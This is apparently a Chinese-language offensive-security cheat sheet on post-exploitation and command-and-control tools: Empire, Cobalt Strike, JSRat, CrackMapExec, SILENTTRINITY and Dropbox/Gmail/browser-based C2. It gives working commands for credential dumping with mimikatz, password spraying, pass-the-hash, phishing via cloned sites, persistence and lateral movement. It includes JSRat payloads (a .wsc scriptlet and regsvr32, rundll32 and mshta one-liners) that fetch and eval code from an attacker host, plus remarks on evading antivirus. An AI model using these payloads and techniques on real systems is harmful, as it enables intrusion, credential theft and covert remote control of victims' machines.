<td>获取域中所有当前子网的列表</td>
</tr>
<tr>
<td>situational_awareness/network/powerview/get_user</td>
<td>查询给定用户或指定域中用户的信息</td>
</tr>
<tr>
<td>situational_awareness/network/powerview/map_domain_trust</td>
<td>使用.CSV输出映射所有可访问的域信任</td>
</tr>
<tr>
<td>situational_awareness/network/powerview/process_hunter</td>
<td>查询远程机器的进程列表</td>
</tr>
<tr>
<td>situational_awareness/network/powerview/set_ad_object</td>
<td>使用SID，名称或SamAccountName来查询指定的域对象</td>
</tr>
<tr>
<td>situational_awareness/network/powerview/share_finder</td>
<td>在域中的计算机上查找共享</td>
</tr>
<tr>
<td>situational_awareness/network/powerview/user_hunter</td>
<td>查找指定组的用户登录的机器</td>
</tr>
</tbody></table>
<h4 id="Trollsploit（恶作剧）"><a href="#Trollsploit（恶作剧）" class="headerlink" title="Trollsploit（恶作剧）"></a>Trollsploit（恶作剧）</h4><table>
<thead>
<tr>
<th>模块名</th>
<th>功能</th>
</tr>
</thead>
<tbody><tr>
<td>trollsploit/get_schwifty</td>
<td>播放Schwifty视频，同时把计算机音量设置最大</td>
</tr>
<tr>
<td>trollsploit/message</td>
<td>发送一个消息框</td>
</tr>
<tr>
<td>trollsploit/process_killer</td>
<td>终止以特定名称开头的任何进程</td>
</tr>
<tr>
<td>trollsploit/rick_ascii</td>
<td>生成一个新的powershell.exe进程运行Lee Holmes’ ASCII Rick Roll</td>
</tr>
<tr>
<td>trollsploit/rick_astley</td>
<td>运行SadProcessor’s beeping rickroll</td>
</tr>
<tr>
<td>trollsploit/thunderstruck</td>
<td>播放Thunderstruck视频，同时把计算机音量设置最大</td>
</tr>
<tr>
<td>trollsploit/voicetroll</td>
<td>通过目标上的合成语音朗读文本</td>
</tr>
<tr>
<td>trollsploit/wallpaper</td>
<td>将.jpg图片上传到目标机器并将其设置为桌面壁纸</td>
</tr>
<tr>
<td>trollsploit/wlmdr</td>
<td>在任务栏中显示气球提示</td>
</tr>
</tbody></table>
<h4 id="Empire-Word"><a href="#Empire-Word" class="headerlink" title="Empire Word"></a>Empire Word</h4><pre><code>&gt;usestager windows/launcher_bat生成bat木马，设置Listener
Word/Excel-&gt;插入-&gt;对象-&gt;由文件创建，选择bat，显示为图标，修改图标
Macro
&gt;usestager windows/macro 设置Listener
Word/Excel-&gt;试图-&gt;宏-&gt;创建，复制macro进去
</code></pre>
<h4 id="Empire派生Cobalt-Strike和MSF"><a href="#Empire派生Cobalt-Strike和MSF" class="headerlink" title="Empire派生Cobalt Strike和MSF"></a>Empire派生Cobalt Strike和MSF</h4><h5 id="派生MSF"><a href="#派生MSF" class="headerlink" title="派生MSF"></a>派生MSF</h5><pre><code>可绕过杀软
Empire
&gt;usemodule code_execution/invoke_shellcode
&gt;set Lhost 192.168.0.1
&gt;set Lport 4444
&gt;set Payload reverse_http
MSF
&gt;use exploit/multi/handler
&gt;set payloadwindows/meterpreter/reverse_http
&gt;set Lhost 192.168.31.247
&gt;set lport 4444
&gt;run
或Empire
&gt;usemodule code_execution/invoke_metasploitpayload
&gt;set URL http://SRVHOST:SRVPORT
MSF
#use exploit/multi/script/web_delivery
#set payload windows/x64/meterpreter/reverse_tcp
设置SRVHOST SRVPORT
</code></pre>
<h5 id="派生Cobalt-Strike-1"><a href="#派生Cobalt-Strike-1" class="headerlink" title="派生Cobalt Strike"></a>派生Cobalt Strike</h5><pre><code>创建监听器/windows/beacon_http/reverse_http 设置端口和主机
Empire
&gt;usemodule code_execution/invoke_shellcode
&gt;set Lhost 192.168.0.1
&gt;set Lport 4444
&gt;set Payload reverse_http
</code></pre>
<h3 id="Cobalt-Strike"><a href="#Cobalt-Strike" class="headerlink" title="Cobalt Strike"></a>Cobalt Strike</h3><h4 id="安装-1"><a href="#安装-1" class="headerlink" title="安装"></a>安装</h4><pre><code>需要JDK环境
&gt;tar -xzvf jdk-8u191-linux-x64.tar.gz
</code></pre>
<h4 id="部署TeamServer"><a href="#部署TeamServer" class="headerlink" title="部署TeamServer"></a>部署TeamServer</h4><pre><code>&gt;./teamserver 192.168.0.107 123456
格式是外网IP和密码
</code></pre>
<h4 id="模块-1"><a href="#模块-1" class="headerlink" title="模块"></a>模块</h4><pre><code>New Connection：新建连接
Preferences：设置外观
Visualization：查看主机的不同形式
VPN Interfaces： VPN接口
Listeners：监听器
Script Interfaces：查看和加载CNA脚本
Close：关闭CS
</code></pre>
<h4 id="连接"><a href="#连接" class="headerlink" title="连接"></a>连接</h4><p><img src="212.png" alt="image"></p>
<h4 id="监听器"><a href="#监听器" class="headerlink" title="监听器"></a>监听器</h4><pre><code>创建
Cobalt Strike -&gt; Listeners点击Add
</code></pre>
<p><img src="213.png" alt="image"></p>
<pre><code>Beacon为CS内部监听器。
Foreign一般与MSF结合使用。
系统架构的支持
</code></pre>
<p><img src="214.png" alt="image"></p>
<h4 id="攻击模块"><a href="#攻击模块" class="headerlink" title="攻击模块"></a>攻击模块</h4><p><img src="215.png" alt="image"><br>|名称   |功能   |<br>| ———— | ———— |<br>|HTML Application   |基于powershell的.hta格式的HTML Application木马，分为可执行文件、PowerShell、VBA三种方法   |<br>|MS Office Macro  |office宏病毒文件   |<br>|Payload Generator   |基于C、C#、COM Scriptlet、Java、Perl、PowerShell、Python、Ruby、VBA等语言的payload   |<br>|USB/CD AutoPlay   |利用USB/CD自动播放运行的木马   |<br>|Windows Dropper   |捆绑器   |<br>|Windows Executable   |生成32位或64位的exe和基于服务的可执行文件、DLL等后门   |<br>|Windows Executable(S)   |生成可执行文件，支持powershell脚本，提供代理功能   |</p>
<pre><code>Web Drive-by基于WEB的攻击模块
</code></pre>
<table>
<thead>
<tr>
<th>名称</th>
<th>功能</th>
</tr>
</thead>
<tbody><tr>
<td>Manage</td>
<td>管理开启的模块</td>
</tr>
<tr>
<td>Clone Site</td>
<td>克隆网站</td>
</tr>
<tr>
<td>Host File</td>
<td>提供文件下载</td>
</tr>
<tr>
<td>Scripted Web Delivery</td>
<td>基于Web的攻击Payload</td>
</tr>
<tr>
<td>Signed Applet Attack</td>
<td>运行java自签名的攻击模块</td>
</tr>
<tr>
<td>Smart Applet Attack</td>
<td>自动检测Java版本并利用已知的exploits攻击</td>
</tr>
<tr>
<td>System Profiler</td>
<td>信息探测模块</td>
</tr>
</tbody></table>
<h4 id="视图模块"><a href="#视图模块" class="headerlink" title="视图模块"></a>视图模块</h4><table>
<thead>
<tr>
<th>Applications</th>
<th>显示靶机应用信息</th>
</tr>
</thead>
<tbody><tr>
<td>Credentials</td>
<td>显示密码(hashdump和mimikatz获取的)</td>
</tr>
<tr>
<td>Downloads</td>
<td>下载文件</td>
</tr>
<tr>
<td>Event Log</td>
<td>事件日志</td>
</tr>
<tr>
<td>Keystrokes</td>
<td>键盘记录</td>
</tr>
<tr>
<td>Proxy Pivots</td>
<td>代理信息</td>
</tr>
<tr>
<td>Screenshots</td>
<td>屏幕截图</td>
</tr>
<tr>
<td>Script Console</td>
<td>加载脚本</td>
</tr>
<tr>
<td>Targets</td>
<td>查看目标</td>
</tr>
<tr>
<td>Web Log</td>
<td>查看web日志</td>
</tr>
</tbody></table>
<pre><code>创建powershell脚本
</code></pre>
<p><img src="216.png" alt="image"><br><img src="217.png" alt="image"></p>
<pre><code>复制脚本到目标机执行即可上线.
</code></pre>
<p><img src="218.png" alt="image"></p>
<h4 id="交互-1"><a href="#交互-1" class="headerlink" title="交互"></a>交互</h4><pre><code>右键目标机Interact进入交互模式
Access    
Dump hashes    获取密码
Elevate    提权
Golden Ticket    黄金票据注入会话
Make token    制作令牌
Run Mimikatz    运行mimikatz
Spawn As    以靶机其他用户权限生成会话
Explore    
Browser Pivot    劫持浏览器
Desktop(VNC)    远程VNC
File Browser    文件管理
Net View    执行命令net view
Port scan    端口扫描
Process list    进程列表
Screenshot    截图
Pivoting        
SOCKS Server    代理
Listener    已获权限的机器当作监听器(反向端口转发)
Deploy VPN    部署VPN
Spawn    
派生会话：联动MSF或Armitage    
右键执行mimikatz即可获取hash及明文密码
</code></pre>
<p><img src="219.png" alt="image"></p>
<pre><code>视图-&gt;凭证信息列出密码，类似empire的creds命令
</code></pre>
<p><img src="220.png" alt="image"></p>
<h4 id="Beacon"><a href="#Beacon" class="headerlink" title="Beacon"></a>Beacon</h4><pre><code>argue                     进程参数欺骗
blockdlls                  阻止子进程加载非Microsoft DLL
browserpivot              注入受害者浏览器进程
bypassuac                绕过UAC提升权限
cancel                    取消正在进行的下载
cd                        切换目录
checkin                   强制让被控端回连一次
clear                     清除beacon内部的任务队列
connect                   Connect to a Beacon peer over TCP
covertvpn                 部署Covert VPN客户端
cp                        复制文件
dcsync                    从DC中提取密码哈希
desktop                   远程桌面(VNC)
dllinject                   反射DLL注入进程
dllload                    使用LoadLibrary将DLL加载到进程中
download                 下载文件
downloads                列出正在进行的文件下载
drives                     列出目标盘符
elevate                    使用exp
execute                   在目标上执行程序(无输出)
execute-assembly         在目标上内存中执行本地.NET程序
exit                       终止beacon会话
getprivs                   Enable system privileges on current token
getsystem                 尝试获取SYSTEM权限
getuid                     获取用户ID
hashdump                  转储密码哈希值
help                       帮助
inject                      在注入进程生成会话
jobkill                     结束一个后台任务
jobs                       列出后台任务
kerberos_ccache_use       从ccache文件中导入票据应用于此会话
kerberos_ticket_purge     清除当前会话的票据
kerberos_ticket_use       Apply 从ticket文件中导入票据应用于此会话
keylogger                 键盘记录
kill                      结束进程
link                      Connect to a Beacon peer over a named pipe
logonpasswords            使用mimikatz转储凭据和哈希值
ls                        列出文件
make_token                创建令牌以传递凭据
mimikatz                  运行mimikatz
mkdir                     创建一个目录
mode dns                  使用DNS A作为通信通道(仅限DNS beacon)
mode dns-txt              使用DNS TXT作为通信通道(仅限D beacon)
mode dns6                 使用DNS AAAA作为通信通道(仅限DNS beacon)
mode http                 使用HTTP作为通信通道
mv                        移动文件
net                       net命令
note                      备注       
portscan                  进行端口扫描
powerpick                 通过Unmanaged PowerShell执行命令
powershell                通过powershell.exe执行命令
powershell-import         导入powershell脚本
ppid                      Set parent PID for spawned post-ex jobs
ps                        显示进程列表
psexec                    Use a service to spawn a session on a host
psexec_psh                Use PowerShell to spawn a session on a host
psinject                  在特定进程中执行PowerShell命令
pth                       使用Mimikatz进行传递哈希
pwd                       当前目录位置
reg                       Query the registry
rev2self                  恢复原始令牌
rm                        删除文件或文件夹
rportfwd                  端口转发
run                       在目标上执行程序(返回输出)
runas                     以其他用户权限执行程序
runasadmin                在高权限下执行程序
runu                      Execute a program under another PID
screenshot                屏幕截图
setenv                    设置环境变量
shell                     执行cmd命令
shinject                  将shellcode注入进程
shspawn                   启动一个进程并将shellcode注入其中
sleep                     设置睡眠延迟时间
socks                     启动SOCKS4代理
socks stop                停止SOCKS4
spawn                     Spawn a session 
spawnas                   Spawn a session as another user
spawnto                   Set executable to spawn processes into
spawnu                    Spawn a session under another PID
ssh                       使用ssh连接远程主机
ssh-key                   使用密钥连接远程主机
steal_token               从进程中窃取令牌
timestomp                 将一个文件的时间戳应用到另一个文件
unlink                    Disconnect from parent Beacon
upload                    上传文件
wdigest                   使用mimikatz转储明文凭据
winrm                     使用WinRM横向渗透
wmi                       使用WMI横向渗透
执行命令，在beacon模式下键入shell+命令
</code></pre>
<p><img src="221.png" alt="image"></p>
<pre><code>&gt;sleep 0 交互模式，立刻执行命令
注入DLL到某个进程
&gt;dllload [pid] [c:\path\to\file.dll] DLL需在目标上
&gt;kerberos_ticket_purge 清除票据
&gt;kerberos_ccache_use    [/path/to/file.ccache]  从ccache文件导入票据
&gt;kerberos_ticket_use [/path/to/file.ccache] 从ticket文件导入票据
&gt;kill pid 结束进程
&gt;timestomp [fileA]    [fileB] 修改文件时间戳
&gt;getuid     获取当前用户
&gt;steal_token [pid] 窃取进程ID
&gt;rev2self 恢复原始令牌
&gt;powershell-import    [/path/to/local/script.ps1] 导入PS模块 
&gt;shinject [pid] &lt;x86|x64&gt; [/path/to/my.bin] 向进程注入shellcode
&gt;socks    port在指定端口开启代理
&gt;socks stop停止代理
&gt;rportfwd [bind port]    [forward host]    [forward port]开启端口转发
</code></pre>
<h4 id="克隆网站"><a href="#克隆网站" class="headerlink" title="克隆网站"></a>克隆网站</h4><pre><code>Attacks -&gt; Web Drive-by -&gt; System Profiler
Redirect url设置为目标站，登录成功会挑战到真实网站
钓鱼攻击-&gt;克隆网站
克隆地址写入要克隆的网站
Attack选择刚刚收集信息的网站
Web日志界面可记录键盘
</code></pre>
<p><img src="222.png" alt="image"></p>
<pre><code>攻击-&gt;钓鱼攻击管理-&gt;web服务管理中，可kill掉刚刚的任务
</code></pre>
<p><img src="223.png" alt="image"></p>
<h4 id="office宏"><a href="#office宏" class="headerlink" title="office宏"></a>office宏</h4><p><img src="224.png" alt="image"><br><img src="225.png" alt="image"><br><img src="226.png" alt="image"></p>
<h4 id="钓鱼邮件-1"><a href="#钓鱼邮件-1" class="headerlink" title="钓鱼邮件"></a>钓鱼邮件</h4><pre><code>新克隆一个网站
</code></pre>
<p><img src="227.png" alt="image"></p>
<pre><code>Embed URL选择克隆好的网站
</code></pre>
<p><img src="228.png" alt="image"><br><img src="229.png" alt="image"><br><img src="230.png" alt="image"></p>
<pre><code>里面的超链接已经被Embed URL克隆好的URL替换掉了
</code></pre>
<p><img src="231.png" alt="image"><br><img src="232.png" alt="image"></p>
<pre><code>若是要加载附件，需注意附件的免杀
</code></pre>
<h4 id="加载脚本"><a href="#加载脚本" class="headerlink" title="加载脚本"></a>加载脚本</h4><pre><code>https://github.com/rsmudge/ElevateKit 提权脚本
&gt;git clone https://github.com/rsmudge/ElevateKit.git
&gt;git clone https://github.com/TheKingOfDuck/myScripts.git
Cobalt Strike -&gt; Scripts 选择elevate.cna加载
提权的EXP列表就会增加已经加入的模块
</code></pre>
<h4 id="浏览器劫持"><a href="#浏览器劫持" class="headerlink" title="浏览器劫持"></a>浏览器劫持</h4><pre><code>beacon 设为交互模式
beacon&gt; sleep 0
[Beacon] → Explore → Browser Pivot
选择打对勾的注入，会返回一个proxy，服务器IP+端口
&gt;chromium --no-sandbox --ignore-certificate-errors --proxy-server=服务器IP:端口
访问网址
</code></pre>
<h4 id="权限维持"><a href="#权限维持" class="headerlink" title="权限维持"></a>权限维持</h4><pre><code>https://github.com/DeEpinGh0st/Erebus
加载 cna 脚本
Cobalt Strike → Script Manager → Load → Erebus 中的 Main.cna
生成 Payload
Attacks → Packages→ Windows Executable(S)
Erebus → Persistence选择维持方法
</code></pre>
<h4 id="横向-1"><a href="#横向-1" class="headerlink" title="横向"></a>横向</h4><pre><code>扫描存活主机
&gt;portscan ip/网段 ports端口 扫描协议(arp、icmp、none) 线程
&gt;portscan 192.168.1.0/24 445 arp 100
或右键目标&gt;扫描
点击工具栏的View–&gt;Targets，查看端口探测后的存活主机。（Targets可自行添加）
Login-&gt;psexec进行hash传递登录
</code></pre>
<h4 id="隔离网络"><a href="#隔离网络" class="headerlink" title="隔离网络"></a>隔离网络</h4><h5 id="权限机中转"><a href="#权限机中转" class="headerlink" title="权限机中转"></a>权限机中转</h5><pre><code>Pivoting -&gt;Listener新建一条已有权限机器的监听器
</code></pre>
<p><img src="233.png" alt="image"><br><img src="234.png" alt="image"><br><img src="235.png" alt="image"></p>
<pre><code>选择 Attacks-&gt;Packages-&gt;Windows Executable(Stageless) 
</code></pre>
<p><img src="236.png" alt="image"></p>
<pre><code>上传生成的payload到已上线的目标机中，上传PsExec.exe
beacon&gt;shell C:\psexec.exe -accepteula \\10.1.1.105 -u administrator -p xxx -d -c C:\beacon.exe
</code></pre>
<p><img src="237.png" alt="image"></p>
<h5 id="SMB-beacon"><a href="#SMB-beacon" class="headerlink" title="SMB_beacon"></a>SMB_beacon</h5><pre><code>新建监听器(bind)windows/beacon_smb/bind_pipe
执行
&gt;psexec 机器名 ADMIN$/c$ bind
</code></pre>
<h5 id="SSH-login"><a href="#SSH-login" class="headerlink" title="SSH login"></a>SSH login</h5><pre><code>&gt;ssh 10.1.1.98:22 root admin
</code></pre>
<p><img src="238.png" alt="image"></p>
<h4 id="代理"><a href="#代理" class="headerlink" title="代理"></a>代理</h4><pre><code>&gt;socks 690
视图-&gt;代理信息-tunnel 直接复制，粘贴到MSF中
</code></pre>
<h4 id="部署VPN"><a href="#部署VPN" class="headerlink" title="部署VPN"></a>部署VPN</h4><p><img src="239.png" alt="image"></p>
<pre><code>选择内网网卡
</code></pre>
<p><img src="240.png" alt="image"><br><img src="241.png" alt="image"><br><img src="242.png" alt="image"></p>
<pre><code>添加
</code></pre>
<p><img src="243.png" alt="image"><br><img src="244.png" alt="image"><br><img src="245.png" alt="image"></p>
<pre><code>删除
</code></pre>
<p><img src="246.png" alt="image"></p>
<h4 id="Cobalt-strike派生-Empire和MSF"><a href="#Cobalt-strike派生-Empire和MSF" class="headerlink" title="Cobalt strike派生 Empire和MSF"></a>Cobalt strike派生 Empire和MSF</h4><h5 id="派生Empire-1"><a href="#派生Empire-1" class="headerlink" title="派生Empire"></a>派生Empire</h5><pre><code>创建一个Listener
创建一个stager
&gt;usestager windows/shellcode 执行，会生成/tmp/launcher.bin
CS 使用PS命令查找进程，进行进程注入(&gt;shinject 进程id x64)，选择launcher.bin即可
</code></pre>
<h5 id="派生MSF-1"><a href="#派生MSF-1" class="headerlink" title="派生MSF"></a>派生MSF</h5><pre><code>使用CS的外部监听器
windows/foreign/reverse_dns_txt
windows/foreign/reverse_http
windows/foreign/reverse_https
windows/foreign/reverse_tcp
msf开启监听
cobalt strike会话主机上点击spwan，创建外部监听器，选择windows/foreign/reverse_tcp指定MSF监听的IP和端口即可
</code></pre>
<h3 id="JSRat-1"><a href="#JSRat-1" class="headerlink" title="JSRat"></a>JSRat</h3><pre><code>https://github.com/Hood3dRob1n/JSRat-Py
https://github.com/Ridter/MyJSRat
启动
&gt;python JSRat.py -i 192.168.0.107 -p 1234
MyJSRat可以-c参数指定执行的命令
</code></pre>
<p><img src="247.png" alt="image"></p>
<pre><code>/connect是回连地址，/wtf是执行代码
</code></pre>
<p><img src="248.png" alt="image"></p>
<pre><code>直接在靶机执行
</code></pre>
<p><img src="249.png" alt="image"></p>
<pre><code>或
&gt;regsvr32.exe /u /n /s /i:http://192.168.0.107:1234/file.sct scrobj.dll
JSRat显示上线
</code></pre>
<p><img src="250.png" alt="image"><br><img src="251.png" alt="image"></p>
<pre><code>Wsc方式
</code></pre>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot;?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">package</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">component</span> <span class="attr">id</span>=<span class="string">&quot;testCalc&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">language</span>=<span class="string">&quot;JScript&quot;</span>&gt;</span></span><br><span class="line">&lt;![CDATA[</span><br><span class="line"><span class="javascript">        rat=<span class="string">&quot;rundll32.exe javascript:\&quot;\\..\\mshtml,RunHTMLApplication \&quot;;document.write();h=new%20ActiveXObject(\&quot;WinHttp.WinHttpRequest.5.1\&quot;);w=new%20ActiveXObject(\&quot;WScript.Shell\&quot;);try&#123;v=w.RegRead(\&quot;HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Internet%20Settings\\\\ProxyServer\&quot;);q=v.split(\&quot;=\&quot;)[1].split(\&quot;;\&quot;)[0];h.SetProxy(2,q);&#125;catch(e)&#123;&#125;h.Open(\&quot;GET\&quot;,\&quot;http://192.168.0.107:1234/connect\&quot;,false);try&#123;h.Send();B=h.ResponseText;eval(B);&#125;catch(e)&#123;new%20ActiveXObject(\&quot;WScript.Shell\&quot;).Run(\&quot;cmd /c taskkill /f /im rundll32.exe\&quot;,0,true);&#125;&quot;</span>;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">new</span> ActiveXObject(<span class="string">&quot;WScript.Shell&quot;</span>).Run(rat,<span class="number">0</span>,<span class="literal">true</span>);</span></span><br><span class="line">]]&gt;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">component</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">package</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<pre><code>&gt;rundll32.exe javascript:&quot;\..\mshtml,RunHTMLApplication &quot;;document.write();GetObject(&quot;script:http://192.168.0.107/jsrat.wsc&quot;)
Mshta方式
&gt;mshta javascript:&quot;\..\mshtml,RunHTMLApplication &quot;;document.write();h=new%20ActiveXObject(&quot;WinHttp.WinHttpRequest.5.1&quot;);h.Open(&quot;GET&quot;,&quot;http://192.168.0.107:1234/connect&quot;,false);try&#123;h.Send();b=h.ResponseText;eval(b);&#125;catch(e)&#123;new%20ActiveXObject(&quot;WScript.Shell&quot;).Run(&quot;cmd /c taskkill /f /im mshta.exe&quot;,0,true);&#125;
</code></pre>
<h3 id="CrackMapExec"><a href="#CrackMapExec" class="headerlink" title="CrackMapExec"></a>CrackMapExec</h3><h4 id="信息收集-1"><a href="#信息收集-1" class="headerlink" title="信息收集"></a>信息收集</h4><pre><code>返回活动主机
&gt;crackmapexec smb 192.168.0.0/24
</code></pre>
<p><img src="252.png" alt="image"></p>
<h4 id="爆破-1"><a href="#爆破-1" class="headerlink" title="爆破"></a>爆破</h4><pre><code>支持协议ssh,smb,winrm,mssql,http
爆破smb协议，两台机器，一个用户名多个密码
&gt;crackmapexec smb 192.168.0.98 192.168.0.55 -u username1 -p password1 password2
&gt;crackmapexec smb 192.168.0.0/24 -d zone.com -u y -p &#39;password&#39; --shares
</code></pre>
<p><img src="253.png" alt="image"></p>
<pre><code>密码喷射
&gt;crackmapexec &lt;protocol&gt; &lt;target(s)&gt; -u username1 username2 -p password1
指定字典
&gt;crackmapexec &lt;protocol&gt; &lt;target(s)&gt; -u /tmp/user.txt -p /tmp/pass.txt
Hash爆破
&gt;crackmapexec &lt;protocol&gt; &lt;target(s)&gt; -u /tmp/user.txt -H /tmp/ntlm.txt
</code></pre>
<h4 id="可用模块"><a href="#可用模块" class="headerlink" title="可用模块"></a>可用模块</h4><pre><code>日志的保存位置
~/.cme/logs
查看协议可用后续模块
&gt;crackmapexec smb -L
</code></pre>
<p><img src="254.png" alt="image"></p>
<pre><code>常用的模块
Get-ComputerDetails获取计算机信息
Bloodhound 执行一个BloodHound脚本获取信息
empire_exec 与empire交互
enum_avproducts 列举AV产品
enum_chrome 获取目标chrome中保存的密码
get_keystrokes 键盘记录
get_netdomaincontroller 列出所有域控制器
get_netrdpsession 列出活动的RDP会话
gpp_autologin 从域控中registry.xml查找自动登录的账户密码
gpp_password 组策略凭据中返回GPP密码
invoke_sessiongopher 保存putty,winscp,filezilla,superputty rdp的session
invoke_vnc 注入一个vnc客户端到内存
met_inject 与msf交互
mimikatz 调用mimikatz模块
mimikatz_enum_chrome 使用mimikatz解密chrome保存的密码
mimikatz_enum_vault_creds 解密windows凭据管理器中保存的密码
mimikittenz 执行咪咪猫(windows密码获取软件)
multirdp 允许多用户登录RDP
netripper 通过API hooking截取平常
pe_inject DLL/EXE注入
rdp 开启或关闭RDP
shellcode_inject 注入shellcode
tokens 列举可用token
uac 查看UAC是否开启
wdigest 开启或关闭wdigest
web_delivery 执行exploit/multi/script/web_delivery模块
查看模块的选项
&gt;crackmapexec smb -M module --options
</code></pre>
<p><img src="255.png" alt="image"></p>
<pre><code>使用方式
&gt;crackmapexec smb &lt;target(s)&gt; -u user -p &#39;P@ssw0rd&#39; -M module -o 参数=值
</code></pre>
<p><img src="256.png" alt="image"></p>
<h4 id="PTH"><a href="#PTH" class="headerlink" title="PTH"></a>PTH</h4><pre><code>&gt;crackmapexec smb &lt;target(s)&gt; -u username -H LMHASH:NTHASH
&gt;crackmapexec smb &lt;target(s)&gt; -u username -H NTHASH
</code></pre>
<h4 id="执行命令-1"><a href="#执行命令-1" class="headerlink" title="执行命令"></a>执行命令</h4><pre><code>&gt;crackmapexec smb 192.168.0.98 -u y -p &#39;qwe12323&#39; -x &#39;command&#39;
</code></pre>
<p><img src="257.png" alt="image"></p>
<pre><code>-X执行powershell命令
&gt;crackmapexec smb 192.168.0.98 -u y -p &#39;qwe12323&#39; -X &#39;POWESHELL&#39;
</code></pre>
<h3 id="koadic"><a href="#koadic" class="headerlink" title="koadic"></a>koadic</h3><pre><code>https://github.com/zerosum0x0/koadic
&gt;git clone https://github.com/zerosum0x0/koadic.git
&gt;cd koadic
&gt;pip3 install -r requirements.txt
&gt;./koadic
</code></pre>
<h3 id="SILENTTRINITY"><a href="#SILENTTRINITY" class="headerlink" title="SILENTTRINITY"></a>SILENTTRINITY</h3><pre><code>https://github.com/byt3bl33d3r/SILENTTRINITY
类似cobalt strike+empire的结合
&gt;git clone https://github.com/byt3bl33d3r/SILENTTRINITY
&gt;pip3 install --user pipenv &amp;&amp; pipenv install &amp;&amp; pipenv shell
&gt;python st.py
服务端执行
&gt;python3 st.py teamserver &lt;teamserver_ip&gt; &lt;teamserver_password&gt;
&gt;python3 st.py teamserver 192.168.0.108 123456
也可加参数--port指定端口
</code></pre>
<p><img src="258.png" alt="image"></p>
<pre><code>客户端执行
&gt;python3 st.py client wss://&lt;username&gt;:&lt;teamserver_password&gt;@&lt;teamserver_ip&gt;:5000
&gt;python3 st.py client wss://y:123456@192.168.0.108:5000
</code></pre>
<p><img src="259.png" alt="image"></p>
<pre><code>&gt;listeners命令进入监听器目录
&gt;use http选择监听器
&gt;options命令查看需要配置的参数
</code></pre>
<p><img src="260.png" alt="image"></p>
<pre><code>&gt;set Port 8081 使用set命令配置参数
&gt;start 启动监听器
&gt;list查看运行中的监听器
</code></pre>
<p><img src="261.png" alt="image"></p>
<pre><code>&gt;stop http使用stop+监听器名字停止监听器
&gt;stagers进入payload目录
&gt;list列出可用payload
</code></pre>
<p><img src="262.png" alt="image"></p>
<pre><code>&gt;use payloadname 命令use+payload名字
&gt;generate http generate+监听器名字生成payload
</code></pre>
<p><img src="263.png" alt="image"></p>
<h3 id="Browser-C2"><a href="#Browser-C2" class="headerlink" title="Browser C2"></a>Browser C2</h3><pre><code>360全套+火绒没有拦截
缺点:会有黑框，并且打开chrome浏览器，功能限制
https://github.com/0x09AL/Browser-C2
&gt;go get -u github.com/gorilla/mux
&gt;go get -u github.com/chzyer/readline
&gt;git clone https://github.com/0x09AL/Browser-C2.git
/Browser-C2/agent/agent.go修改C2地址
</code></pre>
<p><img src="264.png" alt="image"></p>
<pre><code>修改chrome的位置
</code></pre>
<p><img src="265.png" alt="image"></p>
<pre><code>编译客户端
&gt;CGO_ENABLED=1 GOARCH= GOOS=windows go build
</code></pre>
<p><img src="266.png" alt="image"></p>
<pre><code> /Browser-C2/static/jquery.js修改控制服务器IP
</code></pre>
<p><img src="267.png" alt="image"></p>
<pre><code>转到主目录编译服务器端
&gt;go build
靶机执行生成好的客户端
攻击机监听
</code></pre>
<p><img src="268.png" alt="image"></p>
<pre><code>此框架与靶机之间通信未加密，功能有限，可与msf、cs、poshc2、empire等框架建立联系。
</code></pre>
<h3 id="DropBox-C2"><a href="#DropBox-C2" class="headerlink" title="DropBox C2"></a>DropBox C2</h3><pre><code>&gt;git clone https://github.com/Arno0x/DBC2 dbc2
&gt;cd dbc2
&gt;pip install -r requirements.txt
&gt;chmod +x dropboxC2.py
https://www.dropbox.com/developers/apps/create
创建好后要生成个accesstoken，填入config.py中
</code></pre>
<p><img src="269.png" alt="image"></p>
<pre><code>执行
</code></pre>
<p><img src="270.png" alt="image"></p>
<pre><code>这里需设置一个与受控机交互的加密密码
发布agent
&gt;publishStage dbc2_agent.exe
使用命令listPublishedStage可以看到已发布的agent
</code></pre>
<p><img src="271.png" alt="image"></p>
<pre><code>生成payload
&gt;genStager [tab]查看可生成的格式
</code></pre>
<p><img src="272.png" alt="image"></p>
<pre><code>&gt;genStager oneliner default生成powershell格式payload
</code></pre>
<p><img src="273.png" alt="image"></p>
<pre><code>&gt;genStager batch default生成bat格式
</code></pre>
<p><img src="274.png" alt="image"></p>
<pre><code>Msbuild，其余不做演示
</code></pre>
<p><img src="275.png" alt="image"></p>
<pre><code>这里使用powershell格式的，在受控机运行
</code></pre>
<p><img src="276.png" alt="image"></p>
<pre><code>攻击机可以看到上线
</code></pre>
<p><img src="277.png" alt="image"></p>
<pre><code>&gt;list命令可以看到已控机器
</code></pre>
<p><img src="278.png" alt="image"></p>
<pre><code>使用use命令与受控机器交互
</code></pre>
<p><img src="279.png" alt="image"></p>
<pre><code>输入?获得后续命令
</code></pre>
<p><img src="280.png" alt="image"></p>
<h3 id="Gmail-C2"><a href="#Gmail-C2" class="headerlink" title="Gmail C2"></a>Gmail C2</h3><h4 id="Gcat"><a href="#Gcat" class="headerlink" title="Gcat"></a>Gcat</h4><pre><code>https://myaccount.google.com/lesssecureapps
启用设置
</code></pre>
<p><img src="281.png" alt="image"></p>
<pre><code>Gmail启用imap
</code></pre>
<p><img src="282.png" alt="image"></p>
<pre><code>将以下脚本转换为exe
# setup.py
from distutils.core import setup
import py2exe
 
setup(console=[&#39;implant.py&#39;])
https://github.com/byt3bl33d3r/gcat
把gcat项目中的implant.py跟以上脚本放在同一目录，修改implant.py中的账户信息
</code></pre>
<p><img src="283.png" alt="image"></p>
<pre><code>&gt;python 1.py py2exe打包
dist目录下生成implant.exe受控机执行
同时也要修改项目中gcat.py中的账户信息
</code></pre>
<p><img src="284.png" alt="image"></p>
<pre><code>在受控机执行implant.exe，如果报错修改email模块以下三行
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email.mime.text import MIMEText
</code></pre>
<p><img src="285.png" alt="image"></p>
